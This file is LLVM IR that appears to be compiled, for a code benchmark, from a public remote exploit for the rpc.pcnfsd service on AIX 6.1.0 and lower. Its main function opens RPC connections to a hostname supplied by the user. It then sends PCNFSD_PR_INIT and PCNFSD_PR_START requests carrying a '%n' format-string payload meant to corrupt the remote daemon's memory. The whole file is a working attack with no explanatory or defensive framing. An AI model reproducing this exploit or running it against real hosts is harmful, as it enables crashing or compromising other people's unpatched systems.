; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_14407.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_14407.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32 }
%struct.TYPE_5__ = type { i32 }
%struct.cm_send = type { i8*, i8* }
%struct.cm_send2 = type { i8*, i8* }
%struct.cm_reply = type { i32 }

@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0 }, align 4
@.str = private unnamed_addr constant [83 x i8] c"-= rpc.pcnfsd remote format string exploit, tested against AIX 6.1.0 and lower =-\0A\00", align 1
@.str.1 = private unnamed_addr constant [78 x i8] c"-= Check Point Software Technologies - Vulnerability Discovery Team (VDT) =-\0A\00", align 1
@.str.2 = private unnamed_addr constant [64 x i8] c"-= Rodrigo Rubira Branco <rbranco *noSPAM* checkpoint.com> =-\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Usage: %s [hostname]\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"AAAA%n%n%n%n%n%n%n%n%n\00", align 1
@.str.5 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.6 = private unnamed_addr constant [43 x i8] c"\0ASending PCNFSD_PR_INIT to the server ... \00", align 1
@PCNFSD_PROG = common dso_local global i32 0, align 4
@PCNFSD_VERS = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"\0Aerror\00", align 1
@PCNFSD_PR_INIT = common dso_local global i32 0, align 4
@xdr_cm_send = common dso_local global i32 0, align 4
@xdr_cm_reply = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [7 x i8] c"done!\0A\00", align 1
@.str.10 = private unnamed_addr constant [39 x i8] c"Sending PCNFSD_PR_START procedure ... \00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@PCNFSD_PR_START = common dso_local global i32 0, align 4
@xdr_cm_send2 = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca %struct.TYPE_5__*, align 8
  %14 = alloca %struct.cm_send, align 8
  %15 = alloca %struct.cm_send2, align 8
  %16 = alloca %struct.cm_reply, align 4
  %17 = alloca %struct.timeval, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %19 = bitcast %struct.timeval* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %19, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 8, i1 false)
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %3, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %31

25:                                               ; preds = %2
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %30 = call i32 @exit(i32 1) #4
  unreachable

31:                                               ; preds = %2
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  store i8* %34, i8** %11, align 8
  %35 = getelementptr inbounds %struct.cm_send, %struct.cm_send* %14, i32 0, i32 0
  store i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0), i8** %35, align 8
  %36 = getelementptr inbounds %struct.cm_send, %struct.cm_send* %14, i32 0, i32 1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.5, i64 0, i64 0), i8** %36, align 8
  %37 = getelementptr inbounds %struct.cm_send2, %struct.cm_send2* %15, i32 0, i32 0
  store i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0), i8** %37, align 8
  %38 = getelementptr inbounds %struct.cm_send2, %struct.cm_send2* %15, i32 0, i32 1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.5, i64 0, i64 0), i8** %38, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.6, i64 0, i64 0))
  %40 = load i8*, i8** %11, align 8
  %41 = load i32, i32* @PCNFSD_PROG, align 4
  %42 = load i32, i32* @PCNFSD_VERS, align 4
  %43 = call %struct.TYPE_5__* @clnt_create(i8* %40, i32 %41, i32 %42, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  store %struct.TYPE_5__* %43, %struct.TYPE_5__** %13, align 8
  %44 = icmp ne %struct.TYPE_5__* %43, null
  br i1 %44, label %48, label %45

45:                                               ; preds = %31
  %46 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %47 = call i32 @exit(i32 -1) #4
  unreachable

48:                                               ; preds = %31
  %49 = load %struct.TYPE_5__*, %struct.TYPE_5__** %13, align 8
  %50 = load i32, i32* @PCNFSD_PR_INIT, align 4
  %51 = load i32, i32* @xdr_cm_send, align 4
  %52 = ptrtoint %struct.cm_send* %14 to i32
  %53 = load i32, i32* @xdr_cm_reply, align 4
  %54 = ptrtoint %struct.cm_reply* %16 to i32
  %55 = bitcast %struct.timeval* %17 to i64*
  %56 = load i64, i64* %55, align 4
  %57 = call i32 @clnt_call(%struct.TYPE_5__* %49, i32 %50, i32 %51, i32 %52, i32 %53, i32 %54, i64 %56)
  store i32 %57, i32* %18, align 4
  %58 = load %struct.TYPE_5__*, %struct.TYPE_5__** %13, align 8
  %59 = call i32 @clnt_destroy(%struct.TYPE_5__* %58)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.10, i64 0, i64 0))
  %62 = load i8*, i8** %11, align 8
  %63 = load i32, i32* @PCNFSD_PROG, align 4
  %64 = load i32, i32* @PCNFSD_VERS, align 4
  %65 = call %struct.TYPE_5__* @clnt_create(i8* %62, i32 %63, i32 %64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  store %struct.TYPE_5__* %65, %struct.TYPE_5__** %13, align 8
  %66 = icmp ne %struct.TYPE_5__* %65, null
  br i1 %66, label %70, label %67

67:                                               ; preds = %48
  %68 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %69 = call i32 @exit(i32 -1) #4
  unreachable

70:                                               ; preds = %48
  %71 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %72 = load %struct.TYPE_5__*, %struct.TYPE_5__** %13, align 8
  %73 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %72, i32 0, i32 0
  store i32 %71, i32* %73, align 4
  %74 = load %struct.TYPE_5__*, %struct.TYPE_5__** %13, align 8
  %75 = load i32, i32* @PCNFSD_PR_START, align 4
  %76 = load i32, i32* @xdr_cm_send2, align 4
  %77 = ptrtoint %struct.cm_send2* %15 to i32
  %78 = load i32, i32* @xdr_cm_reply, align 4
  %79 = ptrtoint %struct.cm_reply* %16 to i32
  %80 = bitcast %struct.timeval* %17 to i64*
  %81 = load i64, i64* %80, align 4
  %82 = call i32 @clnt_call(%struct.TYPE_5__* %74, i32 %75, i32 %76, i32 %77, i32 %78, i32 %79, i64 %81)
  store i32 %82, i32* %18, align 4
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %84 = load %struct.TYPE_5__*, %struct.TYPE_5__** %13, align 8
  %85 = call i32 @clnt_destroy(%struct.TYPE_5__* %84)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.TYPE_5__* @clnt_create(i8*, i32, i32, i8*) #2

declare dso_local i32 @clnt_pcreateerror(i8*) #2

declare dso_local i32 @clnt_call(%struct.TYPE_5__*, i32, i32, i32, i32, i32, i64) #2

declare dso_local i32 @clnt_destroy(%struct.TYPE_5__*) #2

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
